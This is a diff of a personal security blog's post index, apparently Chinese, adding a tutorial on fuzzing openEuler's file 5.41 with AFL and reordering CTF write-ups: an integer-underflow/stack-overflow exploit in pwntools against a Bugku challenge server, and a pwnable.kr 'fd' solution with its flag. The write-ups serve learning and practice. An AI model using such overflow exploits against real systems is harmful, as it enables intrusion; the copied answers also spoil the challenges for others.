@@ -177,6 +177,41 @@
       </tags>
   </entry>
   <entry>
+    <title>Fuzz学习入门之Fuzzing-OpenEuler-file5.41</title>
+    <url>/2022/03/06/Fuzz%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%B9%8BFuzzing-OpenEuler-file5-41/</url>
+    <content><![CDATA[<p>下载AFL</p>
+<p><code>git clone https://github.com/google/AFL.git</code></p>
+<p><strong>Tips：需要将AFL/llvm_mode目录下alf-clang-fast.c中131~134行的代码给去掉，不然编译的时候会报错</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081b92mkj21240u0ti7.jpg" alt="image-20220306154520627"></p>
+<p>在AFL下make生成fuzzer</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081a3npvj21730u0gy1.jpg" alt="image-20220306154652875"></p>
+<p>下载测试的项目：</p>
+<p><code>git clone https://gitee.com/src-openeuler/file.git</code></p>
+<p>把C和C++的编译器改为afl的afl-clang-fast和afl-clang-fast++</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=/home/re1own/github/AFL/afl-clang-fast</span><br><span class="line"><span class="built_in">export</span> CXX=/home/re1own/github/AFL/afl-clang-fast++</span><br></pre></td></tr></table></figure>
+
+<p>指定下安装目录</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./configure --enable-shared=no --prefix=/home/re1own/Project/install/</span><br></pre></td></tr></table></figure>
+
+<p>编译安装</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081c4ux2j21c00u0gs5.jpg" alt="image-20220306151917157"></p>
+<p>编译安装完之后可以发现在之前创建和制定的install目录下有了用AFL插桩生成的目标程序了</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081arcmrj20zk09k3z2.jpg" alt="telegram-cloud-photo-size-5-6131935855611326493-y"></p>
+<p><code>strings file | grep &quot;afl&quot;</code>检查下是否插桩成功，字符串中有afl结合前面编译安装没有报错说明应该插桩成功了</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081cnef3j20lm0l4goi.jpg" alt="image-20220306153619409"></p>
+<p>创建input、output文件夹，测试项目的tests文件下有输入文件，我们把它们转到input中当作种子，然后就可以用afl去fuzzing了</p>
+<p><code>afl-fuzz -i input -o output -m none -t 500+ -- /home/re1own/Project/install/bin/file @@</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081d4vn0j21c00u07bt.jpg" alt="image-20220306155011256"></p>
+<p>实验相关文件链接：<a href="https://github.com/Re1own/IoT_Sec/tree/main/Fuzz/openEuler/file-5.41">https://github.com/Re1own/IoT_Sec/tree/main/Fuzz/openEuler/file-5.41</a></p>
+]]></content>
+      <tags>
+        <tag>fuzz</tag>
+        <tag>OpenEuler</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PWN-64位ROP-Bugku_PWN4</title>
     <url>/2020/11/24/PWN-64%E4%BD%8DROP-Bugku-PWN4/</url>
     <content><![CDATA[<p>没有开任何保护<br><img width="357" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdacnb6ej30ju0ayq4d.jpg"></p>
@@ -192,20 +227,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PWN-pwnable.kr.fd</title>
-    <url>/2020/11/24/PWN-pwnable-kr-fd/</url>
-    <content><![CDATA[<p>第一次用这个oj，界面挺可爱的<br><img width="1628" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd84iewij31l70u0n2e.jpg"></p>
-<p>连上去，发现目录下有flag，但是没有权限打开<br><img width="827" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd83z6r6j31l70u0n2e.jpg"></p>
-<p>有fd的源代码，打开看看<br><img width="824" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd85ehpvj30yx0u0n0w.jpg"></p>
-<p>发现就是一个file IO的问题<br>atoi是C语言中将字符串转化为数字的函数，又有一个read，参数传的fd，0x1234 = 4660<br>那么我们让传入的参数等于4660,这样fd = argv[1] - 0x1234就为0了，这样buf的赋值就是从0位置开始，覆盖32个字节长度，最后让read输入时读入LETMEWIN，到strcmp比较时就能成功匹配了，最后得到flag:mommy! I think I know what a file descriptor is!!<br><img width="812" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd84v8c2j31l70u0n2e.jpg"></p>
-<p>参考wp:<a href="https://0xrick.github.io/pwn/fd/">https://0xrick.github.io/pwn/fd/</a></p>
-]]></content>
-      <tags>
-        <tag>PWN</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PWN-整数溢出&amp;栈溢出-bugku_pwn11</title>
     <url>/2020/11/24/PWN-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA-%E6%A0%88%E6%BA%A2%E5%87%BA-bugku-pwn11/</url>
     <content><![CDATA[<p>长度变量v2定义成无符号类型，所以可以通过溢出，让他为负值<br><img width="510" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdgx3t1xj30sc0xedjm.jpg"></p>
@@ -213,6 +234,20 @@
 <p>0x60<del>0x10覆盖数组，0x10</del>0xC都是覆盖长度变量(不管覆盖成多大都无所谓)，但是i必须要注意，read是通过s[i]来覆盖整个栈的，所以我们可以直接改变i的值，让i指向rip位置，也就是s往下98,i赋值为’c’就行，随之就是rip覆盖成getflag的起始地址就行了,hhh<br><img width="1350" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqdh01b6jj31h30u0gsl.jpg"></p>
 <p>EXP:</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;114.116.54.89&quot;</span>,<span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">0xc</span>) + <span class="string">&#x27;c&#x27;</span> + p32(<span class="number">0x080486BB</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>PWN</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PWN-pwnable.kr.fd</title>
+    <url>/2020/11/24/PWN-pwnable-kr-fd/</url>
+    <content><![CDATA[<p>第一次用这个oj，界面挺可爱的<br><img width="1628" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd84iewij31l70u0n2e.jpg"></p>
+<p>连上去，发现目录下有flag，但是没有权限打开<br><img width="827" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd83z6r6j31l70u0n2e.jpg"></p>
+<p>有fd的源代码，打开看看<br><img width="824" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd85ehpvj30yx0u0n0w.jpg"></p>
+<p>发现就是一个file IO的问题<br>atoi是C语言中将字符串转化为数字的函数，又有一个read，参数传的fd，0x1234 = 4660<br>那么我们让传入的参数等于4660,这样fd = argv[1] - 0x1234就为0了，这样buf的赋值就是从0位置开始，覆盖32个字节长度，最后让read输入时读入LETMEWIN，到strcmp比较时就能成功匹配了，最后得到flag:mommy! I think I know what a file descriptor is!!<br><img width="812" alt="image" src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd84v8c2j31l70u0n2e.jpg"></p>
+<p>参考wp:<a href="https://0xrick.github.io/pwn/fd/">https://0xrick.github.io/pwn/fd/</a></p>
 ]]></content>
       <tags>
         <tag>PWN</tag>
